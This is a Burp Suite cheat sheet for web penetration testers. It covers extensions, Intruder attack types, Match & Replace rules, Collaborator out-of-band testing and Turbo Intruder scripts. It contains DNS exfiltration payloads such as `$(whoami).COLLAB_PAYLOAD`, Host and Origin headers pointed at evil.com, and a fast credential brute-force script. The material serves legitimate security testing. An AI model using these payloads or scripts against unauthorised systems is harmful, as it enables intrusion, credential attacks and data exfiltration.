# Burp Suite

## Essential Extensions

### Discovery & Recon

| Extension | Purpose |
|---|---|
| Param Miner | Discovers hidden parameters, headers, and cookies |
| JS Link Finder | Extracts endpoints from JavaScript files |
| JS Miner | Finds secrets, API keys, and sensitive data in JS |
| JsLuice+ | Advanced JS analysis ([repo](https://github.com/0x999-x/jsluicepp)) |
| GAP (GetAllParams) | Extracts parameters from in-scope traffic |
| Reflector | Identifies reflected input in responses |
| Software Vulnerability Scanner | Detects outdated software versions |

### Vulnerability Scanning

| Extension | Purpose |
|---|---|
| Active Scan++ | Enhanced active scanning with additional checks |
| Backslash Powered Scanner | Finds server-side injection via backslash probes |
| Upload Scanner | Tests file upload functionality for bypass |
| Turbo Intruder | Python-based fast fuzzing engine |
| CSRF Scanner | Detects missing CSRF protections |
| HTTP Request Smuggler | Detects request smuggling variants |
| Collaborator Everywhere | Injects Collaborator payloads into all traffic |
| Hackvertor | Tag-based encoding/decoding for payloads |

### Authentication & Authorization

| Extension | Purpose |
|---|---|
| Autorize | Automated authorization enforcement testing (IDOR/BAC) |
| AuthMatrix | Multi-role authorization matrix testing |
| JWT Editor | View, edit, sign, and attack JWT tokens |
| Auth Analyzer | Compares requests across different auth levels |
| Token Tracker | Tracks session tokens across requests |

### Utility

| Extension | Purpose |
|---|---|
| Logger++ | Advanced logging with filters and export |
| Copy As Python-Requests | Copies requests as Python code |
| InQL | GraphQL introspection and query testing |
| Wsdler | WSDL/SOAP parsing and testing |
| Distribute Damage | Distributes requests across multiple hosts |
| IP Rotate | Rotates source IP via AWS API Gateway |

### Resources

- [AwesomeBurpExtensions](https://github.com/snoopysecurity/awesome-burp-extensions)
- [Custom BCheck Scans](https://github.com/j3ssie/custom-bcheck-scan)

---

## Intruder Attack Types

| Type | Description | Use Case |
|---|---|---|
| Sniper | Single payload set, one position at a time | Fuzzing individual parameters |
| Battering Ram | Single payload set, all positions simultaneously | Same value in multiple fields |
| Pitchfork | Multiple payload sets, one per position, in parallel | Username:password pairs |
| Cluster Bomb | Multiple payload sets, all combinations | Credential stuffing (user x pass) |

### Payload Types

| Type | Description |
|---|---|
| Simple List | Static list, one entry per line |
| Runtime File | Read from file at runtime (large lists, not loaded in memory) |
| Numbers | Generate sequences (from X to Y, step Z) |
| Brute Forcer | Character set with min/max length |
| Case Modification | Transform casing (lower, UPPER, Proper) |
| Recursive Grep | Extract payload from previous response |

### Payload Processing Rules

Add processing rules to transform each payload before sending:

- **Add prefix/suffix** -- wrap payloads with delimiters
- **Hash** -- MD5, SHA-1, SHA-256, SHA-512
- **Encode/Decode** -- URL, HTML, Base64, hex
- **Match/Replace** -- regex substitution on payload
- **Substring** -- extract portion of payload

---

## Match & Replace Rules

Settings > Sessions > Match & Replace. Useful rules for testing:

```
# Force HTTP/1.1 (disable HTTP/2 for smuggling tests)
Type: Request header
Match: HTTP/2
Replace: HTTP/1.1

# Add custom header to all requests
Type: Request header
Match: ^$
Replace: X-Custom-Header: test

# Remove security headers for testing
Type: Response header
Match: ^Content-Security-Policy.*$
Replace: (empty)

# Upgrade HTTP to HTTPS in responses
Type: Response body
Match: http://
Replace: https://

# Test with different Host header
Type: Request header
Match: ^Host: .*$
Replace: Host: evil.com

# Inject Origin header for CORS testing
Type: Request header
Match: ^$
Replace: Origin: https://evil.com
```

---

## Session Handling Rules

Project Options > Sessions > Session Handling Rules:

### Anti-CSRF Token Handling

1. Add Session Handling Rule
2. Rule Actions > Run a macro
3. Create macro that fetches the page with the CSRF token
4. Configure parameter handling: derive token from macro response
5. Set scope to target URLs

### Maintaining Authentication

1. Add Session Handling Rule
2. Rule Actions > Check session is valid
3. Define validation: look for logout link or specific response string
4. If invalid: run macro to re-login
5. Update cookies from macro response

---

## Collaborator (OOB Testing)

Burp Collaborator provides an external server for out-of-band interaction detection.

### Usage

```
# Generate payload
Burp Menu > Burp Collaborator Client > Copy to Clipboard
# Payload format: xxxxxxxx.burpcollaborator.net (or oastify.com)

# Use in injection points
<img src="http://COLLAB_PAYLOAD">
{{COLLAB_PAYLOAD}}
http://COLLAB_PAYLOAD/path

# DNS-only exfiltration
$(whoami).COLLAB_PAYLOAD
`whoami`.COLLAB_PAYLOAD
```

### Collabfiltrator

Exfiltrate command output via DNS:

- [Collabfiltrator](https://github.com/0xC01DF00D/Collabfiltrator)

---

## Turbo Intruder Quick Reference

```python
# Basic usage - fast credential brute force
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=True)
    for word in open('/path/to/wordlist.txt'):
        engine.queue(target.req, word.rstrip())

def handleResponse(req, interesting):
    if req.status == 200:
        table.add(req)

# Race condition testing
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=1,
                           pipeline=False)
    for i in range(30):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')
```

---

## Tips and Tricks

### Send Traffic from VPS to Local Burp

```bash
# SSH tunnel (redirect VPS traffic to local Burp)
ssh -R 8080:127.0.0.1:8080 root@VPS_IP -f -N

# Windows with PuTTY
putty.exe -ssh user@host -pw password -R 8080:127.0.0.1:8080

# Use proxy on VPS
curl URL -x http://127.0.0.1:8080
```

### Scope Configuration

```
# Target > Scope > Use advanced scope control
# Include: .*\.target\.com$
# Exclude: .*\.google\.com$, .*\.gstatic\.com$

# Filter proxy history: show only in-scope items
# Proxy > HTTP History > Filter > Show only in-scope items
```

### Workflow Shortcuts

| Action | Tip |
|---|---|
| Mass-test for auth bypass | Use Autorize: browse as admin, auto-replays as low-priv user |
| Find hidden params | Param Miner > Guess headers/params on interesting endpoints |
| Test CORS | Match & Replace: add `Origin: https://evil.com` to all requests |
| OOB detection | Install Collaborator Everywhere, browse the target normally |
| Scope cleanup | Right-click domain in Target > Add to scope, then filter |
| Export findings | Logger++ > filter by interesting responses > export CSV |

### Useful Hotkeys

| Key | Action |
|---|---|
| Ctrl+R | Send to Repeater |
| Ctrl+I | Send to Intruder |
| Ctrl+Shift+R | Switch to Repeater |
| Ctrl+Space | Forward intercepted request |
| Ctrl+U | URL-encode selected text |
| Ctrl+Shift+U | URL-decode selected text |
| Ctrl+B | Base64-encode selected text |
| Ctrl+Shift+B | Base64-decode selected text |

---

## BChecks

Custom passive/active checks written in Burp's BCheck language:

- [custom-bcheck-scan](https://github.com/j3ssie/custom-bcheck-scan)

---

## Articles

- [Payload Processing Rule in Burp Suite (Part 1)](https://www.hackingarticles.in/payload-processing-rule-burp-suite-part-1/)
- [Payload Processing Rule in Burp Suite (Part 2)](https://www.hackingarticles.in/payload-processing-rule-burp-suite-part-2/)
- [Beginners Guide to Burpsuite Payloads (Part 1)](https://www.hackingarticles.in/beginners-guide-burpsuite-payloads-part-1/)
- [Beginners Guide to Burpsuite Payloads (Part 2)](https://www.hackingarticles.in/beginners-guide-burpsuite-payloads-part-2/)
- [How to Burp Good](https://www.n00py.io/2017/10/how-to-burp-good/)
- [Using Burp Session Handling Rules](https://portswigger.net/support/using-burp-suites-session-handling-rules-with-anti-csrf-tokens)
- [Burp Suite Exporter](https://medium.com/@ArtsSEC/burp-suite-exporter-462531be24e)
- [HTTP Script Generator](https://github.com/h3xstream/http-script-generator)
